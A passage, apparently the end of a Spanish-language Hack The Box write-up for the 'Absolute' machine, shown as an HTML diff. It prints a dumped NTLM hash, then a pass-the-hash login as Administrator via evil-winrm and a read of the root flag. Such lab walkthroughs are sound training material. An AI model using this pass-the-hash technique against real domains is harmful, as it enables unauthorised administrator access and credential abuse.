+</span><span class="na">SMB</span><span class="p">         absolute.htb    445    DC               </span><span class="no">DC$:1000:aad3b435b51404eeaad3b435b51404ee:a7864ab463177acb9aec553f18f42577:::</span>
+</code></pre></div></div>
+
+<div><p>Con el hash de Administrator nos conectamos con evil-winrm y leemos la flag final</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ evil-winrm </span><span class="p">-i absolute.htb -u Administrator -H 1f4a6093623653f6488d5aa24c75f2ea
+PS C:\Users\Administrator\Documents> </span><span class="no">whoami</span><span class="p">
+absolute\administrator
+PS C:\Users\Administrator\Documents> </span><span class="no">type</span><span class="p"> ..\Desktop\root.txt
+8b2**************************7f7
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
